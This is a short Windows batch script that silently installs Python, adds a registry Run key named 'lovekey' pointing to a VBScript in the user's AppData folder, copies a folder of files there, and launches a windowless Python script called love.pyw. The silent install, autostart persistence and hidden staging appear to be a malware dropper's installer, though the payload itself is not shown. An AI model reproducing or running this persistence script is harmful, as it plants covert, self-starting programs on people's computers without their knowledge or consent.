IF EXIST C:\Python391\python.exe GOTO pythonInstalled
curl -s "https://www.python.org/ftp/python/3.9.1/python-3.9.1-amd64.exe" --output src\python_installer.exe
"src\python_installer.exe" /quiet PrependPath=1  include_pip=0 Include_test=0 TargetDir=c:\Python391
DEL src\python_installer.exe
:pythonInstalled
REG query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey
IF %errorlevel%==0 GOTO keyInstalled
REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey /t REG_SZ /d %appdata%\file\launch.vbs
:keyInstalled
IF EXIST %appdata%\file GOTO fileCopied
XCOPY src\file %appdata%\file /i
:fileCopied
"C:\Python391\python.exe" "src\file\love.pyw"